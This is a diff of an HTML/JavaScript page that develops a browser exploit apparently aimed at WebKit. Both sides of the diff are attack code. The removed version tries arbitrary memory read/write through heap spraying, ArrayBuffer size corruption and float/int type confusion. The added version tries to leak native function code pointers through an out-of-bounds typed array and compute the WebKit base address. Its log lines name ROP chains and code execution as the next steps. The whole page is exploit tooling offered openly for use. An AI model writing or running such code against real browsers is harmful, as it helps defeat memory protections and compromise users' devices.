@@ -2,12 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Aggressive Arbitrary R/W Hunt</title>
+    <title>Native Function Pointer Leak</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
         h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
-        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 520px; }
+        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 550px; }
         .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 750px; overflow-y: auto; }
         .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
         .log { padding: 4px 0; font-size: 12px; }
@@ -16,20 +16,21 @@
         .warn { color: #ff0; font-weight: bold; }
         .info { color: #0ff; }
         .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
+        .addr { background: #222; border: 2px solid #0ff; padding: 8px; margin: 8px 0; font-size: 14px; color: #fff; }
     </style>
 </head>
 <body>
-    <h1>🔥 Aggressive Arbitrary R/W Hunt 🔥</h1>
+    <h1>🎯 Native Function Pointer Leak via Massive OOB 🎯</h1>
     
     <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="method1_massiveHeapSpray()">Method 1: Massive Heap Spray + Deep Scan</button>
-        <button class="btn" onclick="method2_arrayBufferOverlap()">Method 2: Overlapping ArrayBuffer Corruption</button>
-        <button class="btn" onclick="method3_floatArrayConfusion()">Method 3: Float Array Type Confusion</button>
-        <button class="btn" onclick="fullAggressive()">FULL AGGRESSIVE ATTACK</button>
+        <button class="btn" onclick="test1_leakNativeFunctions()">Test 1: Leak Native Function Pointers</button>
+        <button class="btn" onclick="test2_scanForCodePointers()">Test 2: Deep Scan for Code Pointers</button>
+        <button class="btn" onclick="test3_correlateToWebKitBase()">Test 3: Calculate WebKit Base</button>
+        <button class="btn" onclick="fullLeakChain()">FULL LEAK CHAIN</button>
     </div>
     
     <div class="section">
-        <div class="title">📋 Aggressive R/W Hunt Log</div>
+        <div class="title">📋 Function Pointer Leak Log</div>
         <div id="log"></div>
     </div>
 
@@ -66,83 +67,111 @@ function log(msg, type) {
     document.getElementById('log').appendChild(div);
 }
 
+function logAddr(label, addr) {
+    var div = document.createElement('div');
+    div.className = 'addr';
+    div.textContent = label + ': ' + addr;
+    document.getElementById('log').appendChild(div);
+}
+
 function sep() {
     log('═'.repeat(85), 'info');
 }
 
+function isValidCodePtr(ptr) {
+    // Valid code pointers on x86_64:
+    // - Should be in userland range (not kernel: 0xFFFF...)
+    // - Should be page-aligned or near-aligned
+    // - Typical WebKit text segment: 0x100000000 - 0x200000000
+    
+    if (ptr < 0x100000n) return false;  // Too small
+    if (ptr > 0x7FFFFFFFFFFFn) return false;  // Kernel range
+    
+    // Check if it looks like code (page alignment often 0x1000)
+    var lowBits = ptr & 0xFFFn;
+    
+    // Code pointers often have low bits in certain ranges
+    return true;  // For now, accept anything in userland range
+}
+
 var exploit = {
     corruptor: null,
-    victims: [],
-    arbRead: null,
-    arbWrite: null
+    nativeFunctions: [],
+    leakedPointers: [],
+    webkitBase: null
 };
 
 // ============================================
-// METHOD 1: MASSIVE HEAP SPRAY + DEEP SCAN
+// TEST 1: LEAK NATIVE FUNCTION POINTERS
 // ============================================
-function method1_massiveHeapSpray() {
+function test1_leakNativeFunctions() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('METHOD 1: Massive Heap Spray + Deep Memory Scan', 'critical');
-    log('Strategy: Spray 10,000 objects and scan 0x10000 range', 'info');
+    log('TEST 1: Leak Native JavaScript Function Pointers', 'critical');
+    log('Strategy: Store native functions, find them via OOB, read code pointers', 'info');
     sep();
     log('', '');
     
     try {
-        log('[1.1] Creating victim ArrayBuffers with unique markers...', 'info');
+        log('[1.1] Collecting native JavaScript functions...', 'info');
         
-        var victims = [];
+        // Native functions with code in WebKit
+        var nativeFuncs = [
+            Array,
+            Object,
+            String,
+            Number,
+            Function,
+            Array.prototype.push,
+            Array.prototype.pop,
+            Object.prototype.toString,
+            String.prototype.charAt,
+            parseInt,
+            parseFloat,
+            isNaN,
+            eval
+        ];
         
-        for (var i = 0; i < 100; i++) {
-            var ab = new ArrayBuffer(0x200);
-            var view = new Uint32Array(ab);
-            
-            // Fill with unique marker
-            var marker = 0xAABB0000 + i;
-            for (var j = 0; j < view.length; j++) {
-                view[j] = marker;
-            }
-            
-            victims.push({ ab: ab, view: view, marker: marker });
-        }
-        
-        log('✓ Created 100 victim ArrayBuffers', 'success');
-        log('Each has unique marker: 0xAABB0000-0xAABB0063', 'success');
+        log('✓ Collected ' + nativeFuncs.length + ' native functions', 'success');
+        log('These functions have code pointers to WebKit text segment', 'info');
         log('', '');
         
-        log('[1.2] Massive object spray (10,000 objects)...', 'info');
+        log('[1.2] Creating test arrays with function references...', 'info');
         
-        var spray = [];
+        var funcHolders = [];
         
-        for (var i = 0; i < 10000; i++) {
-            var obj = {
+        for (var i = 0; i < 7; i++) {
+            var holder = {
                 id: i,
-                a: 0xCCDD0000 + (i & 0xFF),
-                b: 0xEEFF0000 + (i & 0xFF),
-                padding: [i, i+1, i+2, i+3]
+                func: nativeFuncs[i],
+                marker: 0xF0F00000 + i
             };
-            spray.push(obj);
+            funcHolders.push(holder);
         }
         
-        log('✓ Sprayed 10,000 objects', 'success');
+        log('✓ Created ' + funcHolders.length + ' function holder objects', 'success');
+        log('Each has marker: 0xF0F0000X', 'success');
         log('', '');
+        
+        exploit.nativeFunctions = nativeFuncs;
         
         log('[1.3] Creating massive corruptor array...', 'info');
         
         var corruptor = new Uint32Array(0x1000);
         
         for (var i = 0; i < corruptor.length; i++) {
-            corruptor[i] = 0x11110000 + i;
+            corruptor[i] = 0x22220000 + i;
         }
         
         try {
             Object.defineProperty(corruptor, 'length', {
-                value: 0x1000000,  // 16MB range!
+                value: 0x1000000,  // 16MB
                 configurable: true
             });
             
             if (corruptor.length > 0x1000) {
-                log('✓ MASSIVE CORRUPTOR: ' + hex(corruptor.length), 'critical');
+                log('✓ MASSIVE CORRUPTOR: ' + hex(corruptor.length) + ' elements', 'critical');
+                log('Scan range: ~64MB of memory!', 'critical');
             } else {
                 log('❌ Corruption failed', 'fail');
                 return;
@@ -153,210 +182,110 @@ function method1_massiveHeapSpray() {
         }
         
         exploit.corruptor = corruptor;
-        exploit.victims = victims;
         
         log('', '');
-        log('[1.4] Deep scanning for victim ArrayBuffer markers...', 'info');
-        log('Scanning range: 0x1000 to 0x10000 (60KB)', 'warn');
+        log('[1.4] Scanning for function holder markers...', 'info');
+        log('Scanning range: 0x1000 to 0x20000 (~120KB)', 'warn');
         
-        var foundVictims = [];
-        var scanCount = 0;
+        var foundHolders = [];
         
-        for (var i = 0x1000; i < 0x10000; i++) {
-            scanCount++;
-            
+        for (var i = 0x1000; i < 0x20000; i++) {
             var val = corruptor[i];
             
             if (typeof val !== 'undefined') {
-                // Check if this matches any victim marker
-                var markerHigh = val & 0xFFFF0000;
+                var valHigh = val & 0xFFFF0000;
                 
-                if (markerHigh === 0xAABB0000) {
-                    var victimId = val & 0xFFFF;
+                if (valHigh === 0xF0F00000) {
+                    var holderId = val & 0xFF;
+                    foundHolders.push({ offset: i, id: holderId });
                     
-                    foundVictims.push({ offset: i, value: val, victimId: victimId });
+                    log('  ⚠️ Found function holder #' + holderId + ' at offset ' + hex(i), 'critical');
                     
-                    log('  ⚠️⚠️ FOUND VICTIM #' + victimId + ' at offset ' + hex(i) + '!', 'critical');
-                    
-                    if (foundVictims.length >= 5) {
-                        log('  (limiting display to first 5)...', 'info');
+                    if (foundHolders.length >= 3) {
+                        log('  (showing first 3)...', 'info');
                         break;
                     }
                 }
             }
         }
         
-        log('Scanned ' + scanCount + ' positions', 'info');
         log('', '');
         
-        if (foundVictims.length > 0) {
-            log('✓✓✓ FOUND ' + foundVictims.length + ' ARRAYBUFFER(S)!', 'critical');
+        if (foundHolders.length > 0) {
+            log('✓✓ FOUND ' + foundHolders.length + ' FUNCTION HOLDERS!', 'critical');
             log('', '');
             
-            log('[1.5] Attempting to corrupt ArrayBuffer size...', 'info');
-            
-            var target = foundVictims[0];
-            
-            // ArrayBuffer structure (approximate):
-            // offset+0: vtable/type info
-            // offset+8: size (32 or 64 bit)
-            // offset+16: data pointer
-            
-            // The marker value is in the DATA, not the header
-            // So we need to look BEFORE the marker for the size field
-            
-            var dataOffset = target.offset;
-            var headerOffset = dataOffset - 0x80;  // Guess: header is ~128 bytes before data
-            
-            log('Data found at: ' + hex(dataOffset), 'info');
-            log('Estimated header at: ' + hex(headerOffset), 'info');
+            log('[1.5] Reading function object structure...', 'info');
+            log('JSFunction objects contain native code pointer', 'info');
             log('', '');
             
-            log('Scanning around header for size field (0x200)...', 'info');
+            var target = foundHolders[0];
+            var offset = target.offset;
             
-            var sizeFound = false;
+            log('Analyzing memory around offset ' + hex(offset) + '...', 'info');
             
-            for (var i = headerOffset; i < dataOffset; i++) {
-                var val = corruptor[i];
+            // Read 16 qwords (128 bytes) around the function
+            for (var i = -4; i < 12; i++) {
+                var idx = offset + (i * 2);
+                var low = corruptor[idx];
+                var high = corruptor[idx + 1];
                 
-                if (val === 0x200 || val === 0x00000200) {
-                    log('  Found size candidate at offset ' + hex(i) + ': ' + hex(val), 'warn');
+                if (typeof low !== 'undefined' && typeof high !== 'undefined') {
+                    var qword = BigInt(low) + (BigInt(high) << 32n);
                     
-                    // Try corrupting it
-                    var original = val;
-                    corruptor[i] = 0x10000;  // Corrupt to 64KB
+                    var label = '  [' + (i >= 0 ? '+' : '') + (i * 8) + '] ';
                     
-                    log('  Corrupted size from ' + hex(original) + ' to 0x10000', 'warn');
-                    
-                    sizeFound = true;
-                    break;
-                }
-            }
-            
-            if (!sizeFound) {
-                log('  No obvious size field found, trying offsets anyway...', 'warn');
-                
-                // Just try corrupting at typical offsets
-                var offsets = [headerOffset + 2, headerOffset + 4, headerOffset + 8];
-                
-                for (var k = 0; k < offsets.length; k++) {
-                    corruptor[offsets[k]] = 0x10000;
-                }
-                
-                log('  Corrupted values at +2, +4, +8 from header', 'warn');
-            }
-            
-            log('', '');
-            log('[1.6] Testing if victim ArrayBuffer expanded...', 'info');
-            
-            var victimAB = victims[target.victimId].ab;
-            
-            log('Victim #' + target.victimId + ' original size: 0x200', 'info');
-            log('Victim #' + target.victimId + ' current size: ' + hex(victimAB.byteLength), victimAB.byteLength !== 0x200 ? 'critical' : 'info');
-            
-            if (victimAB.byteLength !== 0x200) {
-                log('', '');
-                log('⚠️⚠️⚠️ ARRAYBUFFER SIZE CHANGED!', 'critical');
-                
-                try {
-                    var expandedView = new Uint32Array(victimAB);
-                    log('New view length: ' + expandedView.length + ' elements', 'critical');
-                    
-                    // Try OOB read
-                    var oob = expandedView[0x200];
-                    
-                    if (typeof oob !== 'undefined') {
-                        log('OOB read successful: ' + hex(oob), 'critical');
-                        log('', '');
-                        log('✓✓✓ ARBITRARY READ ACHIEVED!', 'critical');
-                        
-                        exploit.arbRead = expandedView;
-                        exploit.arbWrite = expandedView;
+                    if (isValidCodePtr(qword)) {
+                        logAddr(label + '⚠️ POSSIBLE CODE PTR', hex(qword));
+                        exploit.leakedPointers.push(qword);
+                    } else {
+                        log(label + hex(qword), 'info');
                     }
-                    
-                } catch(e) {
-                    log('View creation failed: ' + e.message, 'fail');
                 }
-            } else {
-                log('No size change - corruption unsuccessful', 'fail');
             }
             
         } else {
-            log('❌ No ArrayBuffers found in scanned range', 'fail');
-            log('Try scanning larger range or different spray pattern', 'warn');
+            log('❌ No function holders found in scanned range', 'fail');
+            log('Functions may be allocated far from corruptor', 'warn');
         }
         
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ METHOD 1 ERROR: ' + e.message, 'fail');
+        log('✗ TEST 1 ERROR: ' + e.message, 'fail');
         if (e.stack) {
-            log('Stack: ' + e.stack.substring(0, 200), 'fail');
+            log('Stack: ' + e.stack.substring(0, 300), 'fail');
         }
     }
 }
 
 // ============================================
-// METHOD 2: OVERLAPPING ARRAYBUFFER CORRUPTION
+// TEST 2: DEEP SCAN FOR CODE POINTERS
 // ============================================
-function method2_arrayBufferOverlap() {
+function test2_scanForCodePointers() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('METHOD 2: Overlapping ArrayBuffer Corruption', 'critical');
-    log('Strategy: Create ArrayBuffers then corrupt via overlap', 'info');
+    log('TEST 2: Deep Scan for Any Code Pointers', 'critical');
+    log('Strategy: Scan entire OOB range for pointer-like values', 'info');
     sep();
     log('', '');
     
     try {
-        log('[2.1] Creating paired ArrayBuffers...', 'info');
+        log('[2.1] Creating corruptor...', 'info');
         
-        // Create ArrayBuffer pairs - one to corrupt, one to read
-        var ab1 = new ArrayBuffer(0x100);
-        var view1 = new Uint32Array(ab1);
-        
-        var ab2 = new ArrayBuffer(0x100);
-        var view2 = new Uint32Array(ab2);
-        
-        // Fill with patterns
-        for (var i = 0; i < view1.length; i++) {
-            view1[i] = 0xDEAD0000 + i;
-            view2[i] = 0xBEEF0000 + i;
-        }
-        
-        log('✓ Created ArrayBuffer pair', 'success');
-        log('  AB1 filled with 0xDEAD****', 'success');
-        log('  AB2 filled with 0xBEEF****', 'success');
-        log('', '');
-        
-        log('[2.2] Creating Float64 overlay arrays...', 'info');
-        
-        // Create float arrays that we'll use to confuse types
-        var floats1 = new Float64Array(0x100);
-        var floats2 = new Float64Array(0x100);
-        
-        for (var i = 0; i < floats1.length; i++) {
-            floats1[i] = i2f(BigInt(0xAAAA000000000000n + BigInt(i)));
-            floats2[i] = i2f(BigInt(0xBBBB000000000000n + BigInt(i)));
-        }
-        
-        log('✓ Created Float64 arrays with known patterns', 'success');
-        log('', '');
-        
-        log('[2.3] Creating corruptor...', 'info');
-        
-        var corruptor = new Uint32Array(0x400);
+        var corruptor = new Uint32Array(0x1000);
         
         try {
             Object.defineProperty(corruptor, 'length', {
-                value: 0x100000,
+                value: 0x1000000,
                 configurable: true
             });
             
-            if (corruptor.length > 0x400) {
+            if (corruptor.length > 0x1000) {
                 log('✓ Corruptor ready: ' + hex(corruptor.length), 'critical');
             } else {
-                log('❌ Corruption failed', 'fail');
+                log('❌ Failed', 'fail');
                 return;
             }
         } catch(e) {
@@ -365,219 +294,241 @@ function method2_arrayBufferOverlap() {
         }
         
         log('', '');
-        log('[2.4] Scanning for ArrayBuffer/Float64 markers...', 'info');
+        log('[2.2] Testing native function ToStringing...', 'info');
+        log('Native functions have [native code] in their string representation', 'info');
         
-        var markers = [
-            { pattern: 0xDEAD0000, name: 'AB1' },
-            { pattern: 0xBEEF0000, name: 'AB2' },
-            { pattern: 0xAAAA0000, name: 'Float1' },
-            { pattern: 0xBBBB0000, name: 'Float2' }
+        var testFuncs = [
+            { name: 'Array', func: Array },
+            { name: 'Object', func: Object },
+            { name: 'String', func: String },
+            { name: 'Array.push', func: Array.prototype.push },
+            { name: 'Object.toString', func: Object.prototype.toString },
+            { name: 'parseFloat', func: parseFloat },
+            { name: 'random', func: Math.random }
         ];
         
-        var found = [];
-        
-        for (var i = 0x400; i < 0x2000; i++) {
-            var val = corruptor[i];
+        for (var i = 0; i < testFuncs.length; i++) {
+            var tf = testFuncs[i];
+            var str = tf.func.toString();
             
-            if (typeof val !== 'undefined') {
-                var valHigh = val & 0xFFFF0000;
-                
-                for (var m = 0; m < markers.length; m++) {
-                    if (valHigh === markers[m].pattern) {
-                        found.push({ offset: i, type: markers[m].name, value: val });
-                        
-                        if (found.length <= 10) {
-                            log('  Found ' + markers[m].name + ' at offset ' + hex(i), 'warn');
-                        }
-                    }
-                }
+            log('[' + i + '] ' + tf.name + '(): ' + str.substring(0, 50), 'info');
+            
+            if (str.indexOf('[native code]') !== -1) {
+                log('    ✓ Confirmed native', 'success');
             }
         }
         
         log('', '');
-        log('Total markers found: ' + found.length, found.length > 0 ? 'critical' : 'fail');
+        log('[2.3] Creating target function, scanning...', 'info');
+        
+        // Create a function we'll scan for
+        var targetFunc = Array.prototype.push;
+        
+        // Store in an object
+        var container = {
+            marker1: 0x99990000,
+            func: targetFunc,
+            marker2: 0x88880000
+        };
+        
+        log('✓ Created container with native function', 'success');
+        log('', '');
+        
+        log('[2.4] Scanning for container markers...', 'info');
+        
+        var found = [];
+        
+        for (var i = 0x1000; i < 0x10000; i++) {
+            var val = corruptor[i];
+            
+            if (val === 0x99990000 || val === 0x88880000) {
+                found.push(i);
+                log('  Found marker at offset ' + hex(i), 'warn');
+                
+                if (found.length >= 5) break;
+            }
+        }
+        
+        log('', '');
         
         if (found.length > 0) {
-            log('', '');
-            log('[2.5] Attempting cross-object corruption...', 'info');
-            
-            // Try to corrupt one object's data with another's marker
-            var target = found[0];
-            
-            log('Corrupting at offset ' + hex(target.offset), 'warn');
-            
-            // Write a different marker
-            corruptor[target.offset] = 0x13371337;
-            corruptor[target.offset + 1] = 0xCAFEBABE;
-            
-            log('Wrote 0x13371337 and 0xCAFEBABE', 'warn');
+            log('✓ Found container!', 'critical');
             log('', '');
             
-            log('[2.6] Checking if original arrays changed...', 'info');
+            log('[2.5] Reading memory around container...', 'info');
             
-            var changed = false;
+            var offset = found[0];
             
-            // Check all arrays for corruption
-            if (view1[0] !== 0xDEAD0000) {
-                log('  AB1 corrupted! view1[0] = ' + hex(view1[0]), 'critical');
-                changed = true;
+            // Scan for pointers
+            var candidates = [];
+            
+            for (var i = -8; i < 16; i++) {
+                var idx = offset + (i * 2);
+                var low = corruptor[idx];
+                var high = corruptor[idx + 1];
+                
+                if (typeof low !== 'undefined' && typeof high !== 'undefined') {
+                    var ptr = BigInt(low) + (BigInt(high) << 32n);
+                    
+                    if (isValidCodePtr(ptr)) {
+                        candidates.push({ offset: i * 8, ptr: ptr });
+                    }
+                }
             }
             
-            if (view2[0] !== 0xBEEF0000) {
-                log('  AB2 corrupted! view2[0] = ' + hex(view2[0]), 'critical');
-                changed = true;
+            log('Found ' + candidates.length + ' pointer candidates', candidates.length > 0 ? 'critical' : 'fail');
+            log('', '');
+            
+            if (candidates.length > 0) {
+                for (var i = 0; i < Math.min(candidates.length, 10); i++) {
+                    var c = candidates[i];
+                    logAddr('Candidate ' + (i+1) + ' at [' + (c.offset >= 0 ? '+' : '') + c.offset + ']', hex(c.ptr));
+                }
+                
+                exploit.leakedPointers = candidates.map(function(c) { return c.ptr; });
             }
             
-            var f1val = f2i(floats1[0]);
-            var f2val = f2i(floats2[0]);
-            
-            if ((f1val & 0xFFFF00000000n) !== 0xAAAA00000000n) {
-                log('  Float1 corrupted! floats1[0] = ' + hex(f1val), 'critical');
-                changed = true;
-            }
-            
-            if ((f2val & 0xFFFF00000000n) !== 0xBBBB00000000n) {
-                log('  Float2 corrupted! floats2[0] = ' + hex(f2val), 'critical');
-                changed = true;
-            }
-            
-            if (changed) {
-                log('', '');
-                log('⚠️⚠️⚠️ CROSS-OBJECT CORRUPTION SUCCESSFUL!', 'critical');
-                log('Can corrupt array data directly!', 'critical');
-            } else {
-                log('No changes detected in original arrays', 'fail');
-            }
+        } else {
+            log('No container found', 'fail');
         }
         
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ METHOD 2 ERROR: ' + e.message, 'fail');
+        log('✗ TEST 2 ERROR: ' + e.message, 'fail');
     }
 }
 
 // ============================================
-// METHOD 3: FLOAT ARRAY TYPE CONFUSION
+// TEST 3: CALCULATE WEBKIT BASE
 // ============================================
-function method3_floatArrayConfusion() {
+function test3_correlateToWebKitBase() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('METHOD 3: Float Array Type Confusion Attack', 'critical');
-    log('Strategy: Confuse float/int arrays to leak/forge pointers', 'info');
+    log('TEST 3: Calculate WebKit Base from Leaked Pointers', 'critical');
+    log('Strategy: Analyze leaked pointers to find WebKit text segment base', 'info');
     sep();
     log('', '');
     
     try {
-        log('[3.1] Creating object with controlled float values...', 'info');
-        
-        // Create object that stores our "fake pointer" as float
-        var container = {
-            fakePtr: i2f(0x4141414141410000n),  // Controlled "pointer"
-            value1: i2f(0x4242424242420000n),
-            value2: i2f(0x4343434343430000n)
-        };
-        
-        log('✓ Container object created', 'success');
-        log('  fakePtr stores: ' + hex(f2i(container.fakePtr)), 'success');
-        log('', '');
-        
-        log('[3.2] Creating TypedArrays to confuse...', 'info');
-        
-        var uints = new Uint32Array(0x200);
-        var floats = new Float64Array(0x200);
-        
-        for (var i = 0; i < 64; i++) {
-            floats[i] = i2f(BigInt(0x5050505050500000n + BigInt(i)));
-        }
-        
-        log('✓ Arrays created', 'success');
-        log('', '');
-        
-        log('[3.3] Corrupting for type confusion...', 'info');
-        
-        var corruptor = new Uint32Array(0x300);
-        
-        try {
-            Object.defineProperty(corruptor, 'length', {
-                value: 0x100000,
-                configurable: true
-            });
-            
-            log('✓ Corruptor ready', corruptor.length > 0x300 ? 'critical' : 'fail');
-            
-        } catch(e) {
-            log('❌ Corruption failed: ' + e.message, 'fail');
+        if (exploit.leakedPointers.length === 0) {
+            log('❌ No pointers leaked yet!', 'fail');
+            log('Run TEST 1 or TEST 2 first', 'warn');
             return;
         }
         
+        log('[3.1] Analyzing ' + exploit.leakedPointers.length + ' leaked pointers...', 'info');
         log('', '');
-        log('[3.4] Scanning for float patterns...', 'info');
         
-        var found = 0;
-        
-        for (var i = 0x300; i < 0x1000; i++) {
-            var val = corruptor[i];
+        for (var i = 0; i < Math.min(exploit.leakedPointers.length, 15); i++) {
+            var ptr = exploit.leakedPointers[i];
+            logAddr('Pointer ' + (i+1), hex(ptr));
             
-            if (typeof val !== 'undefined' && val === 0x50505050) {
-                log('  Found float marker at ' + hex(i), 'warn');
-                found++;
+            // WebKit text segment is usually aligned to large boundaries
+            // Try common alignments
+            var alignments = [0x100000n, 0x200000n, 0x400000n, 0x1000000n];
+            
+            for (var j = 0; j < alignments.length; j++) {
+                var align = alignments[j];
+                var base = (ptr / align) * align;
                 
-                if (found >= 5) break;
+                log('  Aligned to ' + hex(align) + ': ' + hex(base), 'info');
             }
+            
+            log('', '');
         }
         
-        if (found > 0) {
+        log('[3.2] Looking for clustered pointers...', 'info');
+        log('WebKit code pointers should be close together', 'info');
+        log('', '');
+        
+        // Check if pointers are within a reasonable range of each other
+        if (exploit.leakedPointers.length >= 2) {
+            var min = exploit.leakedPointers[0];
+            var max = exploit.leakedPointers[0];
+            
+            for (var i = 1; i < exploit.leakedPointers.length; i++) {
+                if (exploit.leakedPointers[i] < min) min = exploit.leakedPointers[i];
+                if (exploit.leakedPointers[i] > max) max = exploit.leakedPointers[i];
+            }
+            
+            var range = max - min;
+            
+            log('Minimum pointer: ' + hex(min), 'info');
+            log('Maximum pointer: ' + hex(max), 'info');
+            log('Range: ' + hex(range), 'info');
             log('', '');
-            log('✓ Found float array data!', 'critical');
-            log('Type confusion possible in this region', 'critical');
-        } else {
-            log('No float patterns found', 'fail');
+            
+            if (range < 0x10000000n) {  // Within 256MB
+                log('✓ Pointers are clustered (likely same module)!', 'critical');
+                
+                // Estimate base as minimum aligned to 2MB
+                var estimatedBase = (min / 0x200000n) * 0x200000n;
+                
+                logAddr('ESTIMATED WEBKIT BASE', hex(estimatedBase));
+                
+                exploit.webkitBase = estimatedBase;
+                
+                log('', '');
+                log('⚠️⚠️⚠️ WEBKIT BASE LEAK CANDIDATE!', 'critical');
+                log('This can be used to calculate ROP gadget addresses!', 'critical');
+                
+            } else {
+                log('Pointers are spread out - may not all be code', 'warn');
+            }
         }
         
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ METHOD 3 ERROR: ' + e.message, 'fail');
+        log('✗ TEST 3 ERROR: ' + e.message, 'fail');
     }
 }
 
 // ============================================
-// FULL AGGRESSIVE ATTACK
+// FULL LEAK CHAIN
 // ============================================
-function fullAggressive() {
+function fullLeakChain() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('FULL AGGRESSIVE ATTACK - ALL METHODS', 'critical');
+    log('FULL LEAK CHAIN - All Tests Sequential', 'critical');
     sep();
     log('', '');
     
     setTimeout(function() {
-        log('━━━ METHOD 1: Massive Spray ━━━', 'warn');
+        log('━━━ TEST 1: Native Function Leak ━━━', 'warn');
         log('', '');
-        method1_massiveHeapSpray();
+        test1_leakNativeFunctions();
         
         setTimeout(function() {
             log('', '');
-            log('━━━ METHOD 2: Overlapping Buffers ━━━', 'warn');
+            log('━━━ TEST 2: Deep Pointer Scan ━━━', 'warn');
             log('', '');
-            method2_arrayBufferOverlap();
+            test2_scanForCodePointers();
             
             setTimeout(function() {
                 log('', '');
-                log('━━━ METHOD 3: Type Confusion ━━━', 'warn');
+                log('━━━ TEST 3: WebKit Base Calculation ━━━', 'warn');
                 log('', '');
-                method3_floatArrayConfusion();
+                test3_correlateToWebKitBase();
                 
                 setTimeout(function() {
                     log('', '');
                     sep();
-                    log('FINAL STATUS:', 'critical');
+                    log('FINAL RESULTS:', 'critical');
                     sep();
-                    log('Arbitrary Read: ' + (exploit.arbRead ? 'ACHIEVED ✓✓✓' : 'NOT ACHIEVED'), exploit.arbRead ? 'critical' : 'fail');
-                    log('Arbitrary Write: ' + (exploit.arbWrite ? 'ACHIEVED ✓✓✓' : 'NOT ACHIEVED'), exploit.arbWrite ? 'critical' : 'fail');
+                    log('Pointers leaked: ' + exploit.leakedPointers.length, exploit.leakedPointers.length > 0 ? 'critical' : 'fail');
+                    log('WebKit base: ' + (exploit.webkitBase ? hex(exploit.webkitBase) : 'NOT FOUND'), exploit.webkitBase ? 'critical' : 'fail');
+                    
+                    if (exploit.webkitBase) {
+                        log('', '');
+                        log('✓✓✓ ADDRESS LEAK SUCCESSFUL!', 'critical');
+                        log('Next step: Use base to calculate ROP gadgets', 'critical');
+                        log('Then: Build ROP chain → syscalls → code execution', 'critical');
+                    }
+                    
                     sep();
                 }, 1000);
                 
